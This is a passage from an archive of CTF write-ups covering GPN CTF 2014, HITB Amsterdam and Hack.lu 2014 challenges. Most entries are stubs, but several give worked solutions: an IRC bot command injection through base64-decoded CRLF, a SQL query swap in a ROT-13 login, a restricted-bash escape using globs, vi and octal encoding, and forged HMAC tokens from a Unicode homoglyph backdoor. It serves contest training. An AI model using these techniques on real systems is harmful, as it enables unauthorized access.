**Description:**


## Write-up

> Description
> ------------
> We found a link to a share-hoster site on which we can get some useful data. Unfortunately we're not fast enough to enter the right captcha.
> So your task is to get the Files and us the information.
>
>
> Oh sorry, i almost forgot to give you the link: http://IP/download.php?q=7bf63ebe6646c009

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Totally secure auth

**Category:** Forensic
**Points:** 150
**Description:**

> We wiretapped a developer while logging in to his development system. Login to the admin area to get the key.

> Admin System: [Here](http://ctf.gpn.entropia.de:50081/) 

> File: [pcap.pcapng](pcap_6a480b1e0d61b7244dc5852076b370f9.pcapng)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Weird garbage

**Category:** Programming
**Points:** 100
**Description:**

> We found a strange server with an open port. We connected to it, but only got strange symbols, maybe you can decrypt them.
server: [ctf.gpn.entropia.de:50070](ctf.gpn.entropia.de:50070)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# GPN CTF 2014 - Where is Kurt Krabbel

**Category:** Misc
**Points:** ?
**Description:**


## Write-up

> Where is Waldo? … Um … Sorry we are looking for Kurt… 

## Other write-ups and resources

* none yet
# Hack In The Box Amsterdam: Bin 100

**Category:** Binary
**Points:** 100
**Description:**

> [file](hitb-bin100.elf)

## Write-up

(TODO)

## Other write-ups and resources

* <http://cedricvb.be/post/reverse-engineering-the-hitb-binary-100-ctf-challenge/>
# Hack In The Box Amsterdam 2014

* [Main website]()
* [Scoreboard]()

## Completed write-ups

* none yet

## External write-ups only

* [Binary100](bin-100)

## Missing write-ups

* none yet
# Hack.lu CTF 2014: At Gunpoint

**Category:** Reversing
**Points:** 200
**Author:** freddy
**Description:**

> You’re the sheriff of a small town, investigating news about a gangster squad passing by. Rumor has it they’re easy to outsmart, so you have just followed one to their encampment by the river. You know you can easily take them out one by one, if you would just know their secret handshake…
>
> Download: [gunpoint_2daf5fe3fb236b398ff9e5705a058a7f.dat](gunpoint_2daf5fe3fb236b398ff9e5705a058a7f.dat)

## Write-up

```bash
$ file gunpoint_2daf5fe3fb236b398ff9e5705a058a7f.dat
gunpoint_2daf5fe3fb236b398ff9e5705a058a7f.dat: Gameboy ROM: "FLUX", [ROM ONLY], ROM: 256Kbit
```

So it appears to be a Gameboy game. When running it in an emulator, an image of a cowboy is shown. After some time the screen changes and you are requested to input a correct sequence to get the key.

There are multiple ways of solving this issue. For example, you can extract the sprites from the ROM and puzzle them back together. There’s an easier solution, however. From a programming point of view, it would be logical if the game would call a specific function when the right input was given. So why not just try calling all of those functions at the beginning of the file?

Using [bgb](http://bgb.bircd.org/) you can easily manipulate the instruction pointer and jump all over the code. Simply select a line and press `F6`. By jumping to different call statements, you end up at `0ED4`, which is a call to `0200`. When jumping to `0ED5`, the key is displayed on screen:

![](flag.png)

It’s a little hard to read, but the flag is `tkCXDJheQDNRN`.

## Other write-ups and resources

* [Write-up by tasteless](http://tasteless.eu/2014/10/hack-lu-ctf-2014-at-gunpoint/)
* [Write-up by @bernardomr](http://w00tsec.blogspot.com/2014/10/hacklu-2014-ctf-write-up-at-gunpoint.html)
* <http://radare.today/solving-at-gunpoint-from-hack-lu-2014-with-radare2/>
# Hack.lu CTF 2014: Barmixer Bot

**Category:** Misc
**Points:** 200
**Author:** freddy
**Description:**

> There’s a fun and quirky IRC bot to play with. It responds to commands in private chat but also in #hacklu-saloon on Freenode. We think it’s involved in a devious scheme that distracts people to get their money pickpocketed. So be careful!
>
> **Announcement:** Due to a clever hack, somebody took over the nickname `barmixer-bot`, so it is now called `barmixing-bot`.

## Write-up

In the `#hacklu-saloon` channel on Freenode is a bot with operator privileges named `barmixer-bot` (later `barmixing-bot`). Let’s send him a private message:

```
13:36 <mathiasbynens> !help
13:36 <barmixing-bot> Send messages to the bot or the channel starting with an exclamation mark. Known commands are list, status, karma, math, base64, base64d, rot13, ping, hack, request, list
13:36 <mathiasbynens> !list
13:36 <barmixing-bot> Not implemented ;-)
13:36 <mathiasbynens> !status
13:36 <barmixing-bot> My name is barmixing-bot, my uptime is 3 hours 7 minutes and 18 seconds. I am on the following channels: #hacklu-saloon, #hacklu-secret-channel
```

That `#hacklu-secret-channel` sure looks interesting. Sadly it’s not possible to just `/join` it, as it’s an invite-only channel.

Some testing reveals that the bot’s `!base64d` functionality can be exploited. By letting the bot decode a multi-line message, remote IRC command execution is possible. Let’s use this to trick the bot into inviting us to the secret channel:

```bash
$ printf "hi\r\nINVITE mathiasbynens #hacklu-secret-channel" | base64
aGkNCklOVklURSBtYXRoaWFzYnluZW5zICNoYWNrbHUtc2VjcmV0LWNoYW5uZWw=
```

Let’s feed this message to the bot for decoding:

```
13:37 <mathiasbynens> !base64d aGkNCklOVklURSBtYXRoaWFzYnluZW5zICNoYWNrbHUtc2VjcmV0LWNoYW5uZWw=
13:37 <barmixing-bot> hi
13:37 ** You have been invited to #hacklu-secret-channel by barmixing-bot
```

Joining `#hacklu-secret-channel` reveals the flag in the topic:

```
FLAG: GfeBNmN5XjwDvQB64qoqaEEeYogk4rGH3ikZ0qtc3B3HKLDoAH
```

The flag is `GfeBNmN5XjwDvQB64qoqaEEeYogk4rGH3ikZ0qtc3B3HKLDoAH`.

## Other write-ups and resources

* <http://akaminsky.net/hack-lu-ctf-2014-misc-200-barmixing-bot/>
* <https://ctfcrew.org/writeup/88>
* <http://tasteless.eu/2014/10/hack-lu-ctf-2014-barmixing-bot/>
# Hack.lu CTF 2014: Big Jim’s Map

**Category:** Reversing
**Points:** 400
**Author:** r1cky
**Description:**

> On the hunt for gold we came across a guy called Big Jim, he is supposed to have one of the biggest treasures. One of your friends from the saloon has special skills when it comes to recon, so he was willing to follow the guy around. He found out that the guy is running a backup server which has a map (flag) to his treasure, but the only way to access the server is through a minimal http server, which allows you to request files, but nothing more. The service is backdoored somehow, which allows Jim to gain full access.
>
> We managed to retrieve a copy of the service binary, as well as a copy of the original one.
> Your job is to reverse the binary, find the backdoor and gain access to system to retreive the map (flag). Good luck.
>
> Service running at: `nc wildwildweb.fluxfingers.net 1406`
>
> kernel:
> - Linux bigjim 3.13.0-37-generic #64-Ubuntu SMP Mon Sep 22 21:28:38 UTC 2014 x86_64 GNU/Linux
>
> libs:
> - libc-2.19.so (7b6bbcea6627deace906d80edaefc631)
> - libgcc.so (811b3fc49164d5e9bff7d8ba28c960f0)
> - libstdc++.so.6.0.19 (d57085f9589bad60675e16bdfe2f402e)
>
> download: [files](bigjim_8fecca5dc6569e0668b6e48388ddbd1a.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* [Write-up by @jhector](https://github.com/jhector/big-jims-map)
# Hack.lu CTF 2014: breakout

**Category:** Exploiting
**Points:** 500
**Author:** r1cky
**Description:**

> You are currently putting a team together for your next big heist, robbing the biggest bank in town. Unfortunately the bank has the best security system available. Your best bet is Gus Oakley, he is known for his excotic exploiting techniques. But he is currently imprisoned, which means you have to break him out.
>
> One of your team members managed to gain access to a prison control system running on the main sever. On the server is a file (“flag”) which contains the master key for all doors inside the prison. He also obtained the source code of the service, along with more informations about the system:
>
> service running at: `nc wildwildweb.fluxfingers.net 1404`
>
> kernel:
> Linux breakout 3.13.0-37-generic #64-Ubuntu SMP Mon Sep 22 21:28:38 UTC 2014 x86_64 GNU/Linux
>
> libs:
> - libc-2.19.so (7b6bbcea6627deace906d80edaefc631)
> - libgcc.so (811b3fc49164d5e9bff7d8ba28c960f0)
> - libstdc++.so.6.0.19 (d57085f9589bad60675e16bdfe2f402e)
>
> download: [files](breakout_05673c94eb5dc18580718a6e33fc3505.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up and exploit by @jhector](https://github.com/jhector/breakout)
* [Exploit in Perl by @_cutz](exploit-by-cutz.pl)
* <https://rzhou.org/~ricky/hacklu2014/breakout/>
# Hack.lu CTF 2014: Callgate

**Category:** Exploiting
**Points:** 200
**Author:** TheJH
**Description:**

> Here in the Wild West, we don’t need no kernel code for privilege separation! A real man can do privsep in userspace!
>
> [Download](callgate_67eeae9035af9e1ce66a973a7d8184fd)
>
> `nc wildwildweb.fluxfingers.net 1413`
>
> Note: Read the file `flag`. A file that you’re allowed to access is `#hello`, protected with the password `passw0rd`.

## Write-up

(TODO)

## Other write-ups and resources

* [Exploit in Python by @TheJH](thejh_exploit.py)
* [Write-up by tasteless](http://tasteless.eu/2014/10/hack-lu-ctf-2014-callgate/)
* <https://rzhou.org/~ricky/hacklu2014/callgate/>
# Hack.lu CTF 2014: Cryptochief

**Category:** Reversing
**Points:** 400
**Author:** chief
**Description:**

> Lucky,
> everybody knows you can shoot faster than your shadow, but can you also reverse and break this crypto before your shadow finds out the secret? To give you some kind of challenge, I encrypted the file with the 256 bit fullbit encryption by cryptochief (original), good luck with cracking that! I’ll give you one hit, though; the md5 sum of the decrypted file is `2aa0ce19d626a687517255f68e4e7640`.
>
> [Download](upload_cryptochief_8e7787ef39963a4cfc2d838e70d4ddf0.zip)

## Write-up

(TODO)

## Other write-ups and resources

* [Challenge source](cryptochief-source.tar.gz) (released after the CTF)
* french: <https://securimag.org/wp/challenges/hack-lu-cryptochief/>
* chinese: <https://www.zybuluo.com/romangol/note/40559>
# Hack.lu CTF 2014: Dalton’s Corporate Security Safe for Business

**Category:** Web
**Points:** 200
**Author:** freddy
**Description:**

> The Dalton Brothers are tricking people into buying their “safe” locks. So they can rob them afterwards. The lock has some safety features, as it resets itself after a few seconds. It also requires a lot of valid inputs before it’s letting you open it. Please find out what their weakness is and report back.
>
> <https://wildwildweb.fluxfingers.net:1422/>

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/tyage/af2ee9f59e7db3b67f8b>
* <http://s0beit.me/ctf/hack-lu-writeup-dalton-security/>
* <http://www.mrt-prodz.com/blog/view/2014/10/hacklu-ctf-2014---dalton-corporate-security-safe-for-business-200pts-writeup/>
* [Exploit written in Python by @H4rryp0tt3r](exploit.py)
* <http://tasteless.eu/2014/10/hack-lu-ctf-2014-daltons-corporate-security-safe-for-business/>
* <http://sugarstack.io/hacklu-daltons-corporate-security-safe.html>
# Hack.lu CTF 2014: douchemac

**Category:** Crypto
**Points:** 200
**Author:** martin
**Description:**

> Our companion Jesse James shot a carrier pigeon. It had a letter containing weird characters. Maybe it has something to do with the local gold mine.
>
> [Download](douchemac_5386355bd9a1a4b11b196480f2e6ed78.pcap)

## Write-up

(TODO)

## Other write-ups and resources

* [Write-up by tasteless](http://tasteless.eu/2014/10/hack-lu-ctf-2014-douchemac/)
* [Write-up by captchaflag](http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-douchemac/)
# Hack.lu CTF 2014: Encrypted

**Category:** Web
**Points:** 50
**Author:** TheJH
**Description:**

> Legend says there is a bank vault in Jamestown which cannot be broken into. The only way inside is through an authentication process. Even Jesse James and his companions failed to break the security of this particular bank. Can you do it?
>
> <https://wildwildweb.fluxfingers.net:1411/>

## Write-up

The website at <https://wildwildweb.fluxfingers.net:1411/> displays a simple login form. Entering `a` as the username and `b` as the password results in the following URL:

```
https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG+%60anzr%60+SEBZ+%60hfref%60+JURER+%60anzr%60+%3D+%27n%27+NAQ+%60cnffjbeq%60+%3D+ZQ5%28%27o%27%29
```

This presents an error message saying “bad password”.

That `dhrel` query string parameter value [URL-decodes into the following](https://mothereff.in/url#FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60%20JURER%20%60anzr%60%20%3D%20%27n%27%20NAQ%20%60cnffjbeq%60%20%3D%20ZQ5%28%27o%27%29):

```
FRYRPG `anzr` SEBZ `hfref` JURER `anzr` = 'n' NAQ `cnffjbeq` = ZQ5('o')
```

This is a ROT-13-encoded SQL query. Let’s decode it using [`rot`](https://github.com/mathiasbynens/rot):

```bash
$ rot -n 13 'FRYRPG `anzr` SEBZ `hfref` JURER `anzr` = 'n' NAQ `cnffjbeq` = ZQ5('o')'
SELECT `name` FROM `users` WHERE `name` = a AND `password` = MD5(b)
```

Since we don’t know any username or password, let’s simplify this query a little bit:

```sql
SELECT `name` FROM `users`
```

This ROT-13-encodes into:

```bash
$ rot -n 13 'SELECT `name` FROM `users`'
FRYRPG `anzr` SEBZ `hfref`
```

After URL-encoding, [this becomes](https://mothereff.in/url#FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60):

```
FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60
```

Let’s make the request:

```bash
$ curl 'https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG%20%60anzr%60%20SEBZ%20%60hfref%60'

<!DOCTYPE html>
<html>
  <head>
    <title>Encrypted Login</title>
  </head>
  <body>
    <h1>Encrypted Login</h1>
Hello admin! The flag is flag{nobody_needs_server_side_validation}.  </body>
</html>
```

The flag is `flag{nobody_needs_server_side_validation}`.

## Other write-ups and resources

* [Exploit in Bash by @TheJH](thejh_exploit.sh)
# Hack.lu CTF 2014: Get your gatling at Garrettling! (Part 1)

**Category:** Reversing
**Points:** 500
**Author:** dwuid
**Description:**

> That’s how we promote… well, used to promote our fine, handcrafted gatlings. Proven quality, make you survive every duel (*).
>
> The business flourished, up to the point where someone decided to murder our eponymous company owner, Pat Garrett. Too sad, since we just started delivering our newest product, the Behemot gatling.
>
> Cruel as this world seems to be, apparently, Mr Garrett has been killed by the very same weapon! It must have been one of our loyal customers. At least one of the hundred customers that bought a Behemot. Anyway, we could at least get hold of the weapon. Not of the murderer, though.
>
> [Download](garretling_92f4f4f9492d261a20bf7b7450c7c7a3.exe)
>
> Task A: Be Sherlock, my friend.
>
> Since we cannot afford having all customers killed, we must ask you to help us find the murderer. Clever as he is, Mr Garrett fabricated every Behemot slightly different. The differences help us find the customer who once bought the murder weapon.
>
> Mr Garrett kept notes on the way he designed the Behemots. Maybe you can decipher them and tell us who bought the weapon?
>
> [The flag corresponds to the embedded fingerprint value and starts with `FLG_` (+ASCII).]
>
> (*): Given you start to shoot about 30 seconds early.
>
> Technical Notes on the fingerprinting scheme:
> - The fingerprint value is hidden within the protection code (based on Virtual Machines).
> - In order to extract the mark, you will need to:
>   * group equivalent handlers in order to
>   * assign bits to them.
> - Every handler corresponds to an opcode value (the index of said handler in the handler table).
> - Bits are assigned to each handler that encode a part of the fingerprint value.
> - Ex.: If there are four handlers implementing the same semantics (“equivalent” handlers), each virtual instruction encodes `log_2(4)` = `2` bits depending on the handler it is encoded with.
>
> The two bit values are assigned in ascending order, starting with the _lowest_ opcode:
>
> ```opcode handler semantics assigned bits
> 04 vm_exit 00
> 97 vm_exit 01
> b3 vm_exit 10
> d0 vm_exit 11
> ```
>
> `vm_exit` can be encoded using opcode `04`, `97`, `b3` or `d0`.
> If the virtual instruction `vm_exit` is in one instance encoded as `0xb3`, it encodes two bits of the fingerprint value, namely: `10_2`.
> - All virtual instructions hence encode parts of the fingerprint value. It might be the case that for certain instructions, only one single handler implements the necessary semantics. Intuitively, these instructions cannot encode any bit, as `log_2(1) = 0`.
> - The value/flag is encoded in the first few virtual instructions/opcodes (at `0x4d9414`) and is 256 bits long.
> - Keep in mind that opcodes are encrypted and decryption keys are reset on branches! You will need to emulate opcode decryption.
>
> Flag has a length of 48 bytes.
>
> #### Update
>
> The challenge text gave a different VA for the beginning of the bytecode, actually, it’s `0x4d945d`.
>
> There are 37 unique VM handlers — which does not mean all of them are actually used. Others are duplicates, match characteristics to find them.
>
> Obfuscation for Garrettling’s VM is pattern-based. Remove it by searching for patterns listed below and simplifying them repeatedly.
>
> Only some instructions are obfuscated, iteratively:
>
> ```
> * push arg:
> -------------------------------------------------------
> call _off_1_to_7
> db junk_bytes ; ...
>
> _off_1_to_7:
> mov dword ptr [esp], arg
>
> * push arg:
> -------------------------------------------------------
> push imm ; or: push random_reg
> mov size ptr [esp], arg
>
> * push arg:
> -------------------------------------------------------
> lea esp, dword ptr [esp - 4]
> mov size ptr [esp], arg
>
> * pop arg:
> -------------------------------------------------------
> lea esp, dword ptr [esp + 4]
> mov arg, size ptr [esp - 4]
>
> * cmp dst, src:
> -------------------------------------------------------
> push dst
> add dst, -src_imm
> pop dst
>
> * cmp dst, src:
> -------------------------------------------------------
> push dst
> not src
> add dst, src
> not src
> pop dst
>
> * add dst, src
> -------------------------------------------------------
> sub dst, -src_imm
>
> * add dst, src
> -------------------------------------------------------
> lea dst, dword ptr [dst + src_imm]
>
> * pushf:
> -------------------------------------------------------
> push eax
> lahf
> and eax, 0xff00
> shr eax, 8
> push eax
> push dword ptr [esp + 4]
> pop eax
> pop dword ptr [esp]
>
> * popf:
> -------------------------------------------------------
> push eax
> mov eax, dword ptr [esp + 4]
> shl eax, 8
> sahf
> pop eax
> lea esp, dword ptr [esp + 4]
>
> * mov dst, src:
> -------------------------------------------------------
> push src
> pop dst
>
> * xor dst, src:
> -------------------------------------------------------
> push dst
> not dst
> and dst, src_imm
> push dst
> mov dst, size ptr [esp + size]
> and dst, (~src_imm)
> or dst, size ptr [esp]
> lea esp, dword ptr [esp + 8]
>
> * xor dst, src:
> -------------------------------------------------------
> push src
> push dst
> not dst
> push src
> and dst, src
> pop src
> not src
> and src, size ptr [esp]
> lea esp, dword ptr [esp + size]
> or dst, src
> pop src
> ```

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hack.lu CTF 2014: Get your gatling at Garrettling! (Part 2)

**Category:** Reversing
**Points:** 500
**Author:** dwuid
**Description:**

> That’s how we promote… well, used to promote our fine, handcrafted gatlings. Proven quality, make you survive every duel (*).
>
> The business flourished, up to the point where someone decided to murder our eponymous company owner, Pat Garrett. Too sad, since we just started delivering our newest product, the Behemot gatling.
>
> Cruel as this world seems to be, apparently, Mr Garrett has been killed by the very same weapon! It must have been one of our loyal customers. At least one of the hundred customers that bought a Behemot. Anyway, we could at least get hold of the weapon. Not of the murderer, though.
>
> [Download](garretling_92f4f4f9492d261a20bf7b7450c7c7a3.exe)
>
> Task B: Oh, my sweet revenge.
>
> Let’s talk about revenge. I know our sheriff would not support it, but hey, Mr Garret was one of my closest friends and I demand revenge! To add a bit of symbolism — after all, we’re in a Western — I want to pay the f*cker back using the very same weapon.
>
> Unfortunately, every Behemot is tied to a certain processing unit. In absence of the corresponding unit, the weapon won’t fire at all. We do not have said unit. Can you make the weapon fire regardless?
>
> [The flag corresponds to the trait the weapon expects from the correct processing unit and starts with `FLG_` (+ASCII) and is 32 bytes in size in total.]
>
> (*): Given you start to shoot about 30 seconds early.
>
> #### Update
>
> The challenge text gave a different VA for the beginning of the bytecode, actually, it’s `0x4d945d`.
>
> There are 37 unique VM handlers — which does not mean all of them are actually used. Others are duplicates, match characteristics to find them.
>
> Obfuscation for Garrettling’s VM is pattern-based. Remove it by searching for patterns listed below and simplifying them repeatedly.
>
> Only some instructions are obfuscated, iteratively:
>
> ```
> * push arg:
> -------------------------------------------------------
> call _off_1_to_7
> db junk_bytes ; ...
>
> _off_1_to_7:
> mov dword ptr [esp], arg
>
> * push arg:
> -------------------------------------------------------
> push imm ; or: push random_reg
> mov size ptr [esp], arg
>
> * push arg:
> -------------------------------------------------------
> lea esp, dword ptr [esp - 4]
> mov size ptr [esp], arg
>
> * pop arg:
> -------------------------------------------------------
> lea esp, dword ptr [esp + 4]
> mov arg, size ptr [esp - 4]
>
> * cmp dst, src:
> -------------------------------------------------------
> push dst
> add dst, -src_imm
> pop dst
>
> * cmp dst, src:
> -------------------------------------------------------
> push dst
> not src
> add dst, src
> not src
> pop dst
>
> * add dst, src
> -------------------------------------------------------
> sub dst, -src_imm
>
> * add dst, src
> -------------------------------------------------------
> lea dst, dword ptr [dst + src_imm]
>
> * pushf:
> -------------------------------------------------------
> push eax
> lahf
> and eax, 0xff00
> shr eax, 8
> push eax
> push dword ptr [esp + 4]
> pop eax
> pop dword ptr [esp]
>
> * popf:
> -------------------------------------------------------
> push eax
> mov eax, dword ptr [esp + 4]
> shl eax, 8
> sahf
> pop eax
> lea esp, dword ptr [esp + 4]
>
> * mov dst, src:
> -------------------------------------------------------
> push src
> pop dst
>
> * xor dst, src:
> -------------------------------------------------------
> push dst
> not dst
> and dst, src_imm
> push dst
> mov dst, size ptr [esp + size]
> and dst, (~src_imm)
> or dst, size ptr [esp]
> lea esp, dword ptr [esp + 8]
>
> * xor dst, src:
> -------------------------------------------------------
> push src
> push dst
> not dst
> push src
> and dst, src
> pop src
> not src
> and src, size ptr [esp]
> lea esp, dword ptr [esp + size]
> or dst, src
> pop src
> ```

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hack.lu CTF 2014: Guess the Flag

**Category:** Exploiting
**Points:** 200
**Author:** TheJH
**Description:**

> Look at that guy over there! He’s a bandit from the group that robs the stagecoaches in unpredictable intervals. I think he hasn’t been with them for very long, so he can’t tell whether you’re one of them. Try to look like a bandit and talk to him. He probably won’t just tell you their plan for the attack, but maybe you can ask him some questions?
>
> Download: [guess_the_flag_61cc43171ada149d53afca03c88c2e99.tar](guess_the_flag_61cc43171ada149d53afca03c88c2e99.tar)
>
> `nc wildwildweb.fluxfingers.net 1412`

## Write-up

(TODO)

## Other write-ups and resources

* [Write up by Rogdham](http://r.rogdham.net/24)
* [Exploit in Python by @TheJH](thejh_exploit.py)
* <https://ctfcrew.org/writeup/85>
# Hack.lu CTF 2014: Gunslinger Joe’s Gold Stash

**Category:** Reversing
**Points:** 200
**Author:** cutz
**Description:**

> Silly Gunslinger Joe has learned from his mistakes with his private terminal and now tries to remember passwords. But he’s gotten more paranoid and chose to develope an additional method: protect all his private stuff with a secure locking mechanism that no one would be able to figure out! He’s so confident with this new method that he even started using it to protect all his precious gold. So… we better steal all of it!
>
> SSH: joes\_gold@wildwildweb.fluxfingers.net
> PORT: 1415
> PASSWORD: 1gs67uendsx71xmma8
>
> **Note:** If your username/password combination is not getting accepted, then the challenge is working as expected.

## Write-up

(TODO)

## Other write-ups and resources

* <http://edwardsh.in/hack.lu/2014/10/23/hacklu-2014-ctf-write-up-gunslinger-joes-gold-stash/>
* [Writeup by captchaflag](http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-gunslinger-joes-gold-stash/)
* <https://ctfcrew.org/writeup/86>
* [French](https://securimag.org/wp/challenges/hack-lu-gunslinger-joes-gold-stash/)
# Hack.lu CTF 2014: Gunslinger Joe’s private Terminal

**Category:** Misc
**Points:** 50
**Author:** cutz
**Description:**

> Gunslinger Joe has a pretty bad memory and always forgets the password for his private terminals! That’s why he always uses his username as password but also makes sure that absolutely no one else who knows his name can interact with his secure terminal. Wouldn’t it be super embarrassing for him to prove him wrong?
>
> SSH: gunslinger_joe@wildwildweb.fluxfingers.net
> PORT: 1403

## Write-up

Let’s connect to the SSH server using `gunslinger_joe` as both the username and password, as stated in the challenge description:

```bash
$ ssh -p 1403 gunslinger_joe@wildwildweb.fluxfingers.net
gunslinger_joe@wildwildweb.fluxfingers.net's password:

           ,'-',
          :-----:
      (''' , - , ''')
      \   ' .  , `  /
       \  '   ^  ? /
        \ `   -  ,'
         `j_ _,'       Gunslinger Joe's
    ,- -`\ \  /f        Private Terminal
  ,-      \_\/_/'-
 ,                 `,
 ,          Joe      ,
      /\          \
|    /             \   ',
,   f  :           :`,  ,
<...\  ,           : ,- '
\,,,,\ ;           : j  '
 \    \            :/^^^^'
  \    \            ; ''':
    \   -,         -`.../
     '    - -,`,--`
      \_._'-- '---:

$ id
$ ls
$ ls -lsa
: -: command not found
```

So we indeed have access to a shell, but something strange is going on… It seems like some characters are being filtered.

Entering `-` reveals that our input is passed as an argument to `bash`:

```bash
$ -
: -
: invalid option
Usage:  bash [GNU long option] [option] ...
  bash [GNU long option] [option] script-file ...
GNU long options:
  --debug
  --debugger
  --dump-po-strings
  --dump-strings
  --help
  --init-file
  --login
  --noediting
  --noprofile
  --norc
  --posix
  --rcfile
  --restricted
  --verbose
  --version
Shell options:
  -ilrsD or -c command or -O shopt_option   (invocation only)
  -abefhkmnptuvxBCHP or -o option
```

Realizing that causing a syntax error results in a helpful error message, I entered all printable ASCII characters to see which ones would be removed:

```
$ () { :;} `() { :;}  !"#$%&\'()*+,-./0123456789:;<=>?@[\\]^_`{|}~'
: -c: line 0: syntax error near unexpected token `)'
: -c: line 0: `() { :;} `() { :;}  !"#$%&\'()*+,-./0123456789:;<=>?@[\\]^_`{|}~''
```

So yeah, all alphabetic characters are removed from the input. Entering `*` reveals that there’s a file named `FLAG` in the current working directory:

```bash
$ *
: ./FLAG: Permission denied
```

Let’s check the root directory:

```bash
$ /*
: /bin: Is a directory
```

Hmm, what would the first item in `/bin/*` be?

```bash
$ /*/*
```

Yay! `/*/*` expands to `/bin/bashbug`, which causes `$EDITOR` — in this case, `vi` — to open. From within `vi` we can easily run arbitrary commands:

```
:!id
uid=1000(gunslinger_joe) gid=1000(gunslinger_joe) groups=1000(gunslinger_joe)

:!cat FLAG
flag{joe_thought_youd_suck_at_bash}
```

The flag is `flag{joe_thought_youd_suck_at_bash}`.

### Alternate solution #1

A shorter solution than the one depicted above, is the following.
Entering the character `.` displayed the error

```bash
$ .
: line 0: .: filename argument required
.: usage: . filename [arguments]
```

That looks like `.` is interpreted as a command. Earlier having figured out that `*` was a working way to iterate all files in the current directory, the following command yielded the right result:

```bash
$ . *
./FLAG: line 1: flag{joe_thought_youd_suck_at_bash}: command not found
```

It’s still an error, but at least it delivers.

### Alternate solution #2

Encode the file name `FLAG` in octal and pass it as an argument to `.`:

```bash
$ . $'\106\114\101\107'
./FLAG: line 1: flag{joe_thought_youd_suck_at_bash}: command not found
```

### Alternate solution #3

[Encode `cat` in octal](https://www.gnu.org/software/bash/manual/bashref.html#ANSI_002dC-Quoting) and pass the [`????`](https://www.gnu.org/software/bash/manual/bashref.html#Pattern-Matching) wildcard pattern as the argument:

```bash
$ $'\143\141\164' ????
flag{joe_thought_youd_suck_at_bash}
```

This works because `FLAG` is the first (and only) file with a name that is four characters long, within the current working directory.

## Other write-ups and resources

* none yet
# Hack.lu CTF 2014: Hidden in ρlaιn sιght

**Category:** Crypto
**Points:** 150
**Author:** TheJH
**Description:**

> At our software development company, one of the top developers left in anger. He told us that he had hidden a backdoor in our node.js server application — he thinks that we can’t find it even if we try. I have attached the source code of our fileserver. After registration, you can log in, upload files and create access tokens for your files that others can use to retrieve them. He must have added some way to retrieve files without permission. And we don’t have version control, so we can’t just check his last commits. We have read the source code multiple times, but just can’t figure out how he did it. Maybe he just lied? Can you help us and demonstrate how the backdoor works? We have uploaded a file to `testuser/files/flag.txt` – please try to retrieve it.
>
> Connect to <https://wildwildweb.fluxfingers.net:1409/>. Note that all your files will be purged every 5 minutes.
>
> You can download the service code here: [Download](hiddeninplainsight_7a1f79aab159ace6e4486dc73bd24cc8.js)

## Write-up

[The provided JavaScript source code](hiddeninplainsight_7a1f79aab159ace6e4486dc73bd24cc8.js) reveals that the file access tokens are encrypted as follows:

```js
function hmac_sign(path) {
  var hmac = crypto.createHmac('sha256', HMAC_SECRET)
  hmac.update(path)
  return hmac.digest('hex')
}
```

`HMAC_SECRET` is generated as follows:

```js
var HMAC_SECRET = ''
for (var i=0; i<20; i++) {
  HMAC_SΕCRET = HMAC_SECRET + (Math.random()+'').substr(2)
}
```

So, it looks like that’s a randomly generated value that gets regenerated whenever the service is restarted. This would make it impossible to figure out the access token for a given file — in this case, `testuser/files/flag.txt`.

However, inside the `for` loop, two different variable names are actually being used: one is [`HMAC_S\u0395CRET`](https://mothereff.in/js-escapes#1HMAC%5fS%CE%95CRET) with [U+0395 GREEK CAPITAL LETTER EPSILON](http://codepoints.net/U+0395), and the other is just `HMAC_SECRET` in plain ASCII. This can be observed using a hex viewer. Because of that, the `HMAC_SECRET` that is used is always the same value: the empty string!

The authentication codes are created based on the username followed by a slash followed by the file name:

```js
res.redirect('/files/'+user+'/'+file+'/'+hmac_sign(user+'/'+file))
```

This means we can create the authentication code for the `testuser/files/flag.txt` file as follows:

```js
hmac_sign('testuser/flag.txt');
// → '4a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4'
```

The app uses the URL structure `/files/:user/:file/:signature`, so that becomes `https://wildwildweb.fluxfingers.net:1409/files/testuser/flag.txt/4a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4`. Let’s visit that URL:

```bash
$ curl https://wildwildweb.fluxfingers.net:1409/files/testuser/flag.txt/4a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4
flag{unicode_stego_is_best_stego}
```

The flag is `flag{unicode_stego_is_best_stego}`.

## Other write-ups and resources

* [Exploit in Bash by @TheJH](thejh_exploit.sh)
* <https://hackucf.org/blog/hack-lu-2014-web-150-hidden-in-plain-sight/>
* <https://johnsupercool.github.io/posts/2014/oct./24/hacklu-2014-ctf-crypto150-hidden-in-rlain-sight/>
# Hack.lu CTF 2014: Holy Moses

**Category:** Exploiting
**Points:** 300
**Author:** r1cky
**Description:**

> The craziest saloon in town, called Holy Moses, is throwing one of their crazy parties again. As usually they have a special VIP area, with the hottest people, free drinks and a private band. Each time you hear people talking about it how crazy and amazing it was. But to gain access to the area you need a special invite code and unfortunately for you, you don’t know anybody to get you one. But you are lucky, they have a online service running to enter referal codes and request an invite code. Maybe the programmer did a crappy job and you find a way to gain access to the server and retrieve the invite code (file called `flag`). Good luck.
>
> service running at: `nc wildwildweb.fluxfingers.net 1405`
>
> download: [files](saloon_6ff96a0f14e8cf82f050c91db16aee3b.tar.gz)

## Write-up

* [Holy Moses exploit and write-up using pwntools](https://github.com/zachriggle/pwntools-write-ups/blob/570b468/2014/hacklu/holy-moses/expl.py)

## Other write-ups and resources

* none yet
# Hack.lu CTF 2014: HotCows Dating

**Category:** Web
**Points:** 400
**Author:** qll
**Description:**

